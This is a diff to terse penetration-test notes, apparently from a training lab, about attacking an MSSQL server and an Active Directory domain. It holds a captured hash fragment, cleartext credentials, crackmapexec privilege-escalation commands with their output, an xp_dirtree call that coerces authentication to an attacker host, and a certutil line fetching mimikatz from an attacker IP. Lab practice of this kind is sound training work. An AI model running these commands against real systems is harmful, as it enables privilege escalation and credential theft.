@@ -75,17 +75,25 @@ SQL01$::INLANEFREIGHT:fe53d984e7707524:92C72A3CDBB07BDF1A34FAE0F0AEC4B2:01010000
         DEV01$
         Administrator
         sqldev:Sq!D3vUs3R
-
-
 172.16.15.15
     - shares Download
 172.16.15.20
     - no shares
 
 
+proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv
+[+] sqldev can impersonate netdb (sysadmin)
+
+proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv -o ACTIO
+N=privesc
+[+] sqldev is now a sysadmin! (Pwn3d!)
+ 
+
 
 
  Responder : mssql exec master..xp_dirtree '\\10.10.15.92\test'
+- drop.sc
+
 
  DC01
  sayins:
@@ -96,3 +104,17 @@ SQL01$::INLANEFREIGHT:fe53d984e7707524:92C72A3CDBB07BDF1A34FAE0F0AEC4B2:01010000
  model
  msdb
  interns
+
+ config
+ certutil -urlcache -f http://10.10.14.91:8080/mimikatz.exe mimikatz.exe
+
+
+ ADMIN$      Disk           Remote Admin
+C$          Disk           Default share
+Ccache      Disk           Ccache Files for Users
+CertEnroll  Disk           Active Directory Certificate Services share
+DEV         Disk           Development Share
+DEV_INTERN  Disk           Development Share for Interns
+IPC$        IPC            Remote IPC
+NETLOGON    Disk           Logon server share
+SYSVOL      Disk           Logon server share
